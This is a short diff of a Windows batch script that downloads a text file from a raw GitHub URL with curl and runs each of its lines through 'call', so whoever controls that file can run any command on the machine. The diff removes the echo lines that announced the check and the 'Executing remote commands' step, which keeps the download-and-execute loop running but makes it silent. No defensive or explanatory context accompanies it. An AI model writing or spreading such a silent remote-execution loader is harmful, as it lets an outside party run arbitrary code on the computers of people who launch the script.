@@ -11,7 +11,6 @@ if errorlevel 1 (
 )
 set "URL=https://raw.githubusercontent.com/animationss253/magarni/main/run.txt"
 
-echo Checking website...
 
 curl.exe -fsSL --max-time 15 "%URL%" | findstr /r "." >nul
 
@@ -21,8 +20,6 @@ if errorlevel 1 (
    goto :end
 )
 
-echo Website loaded successfully.
-echo Executing remote commands...
 
 for /f "usebackq delims=" %%A in (`curl.exe -fsSL --max-time 15 "%URL%"`) do (
     call %%A
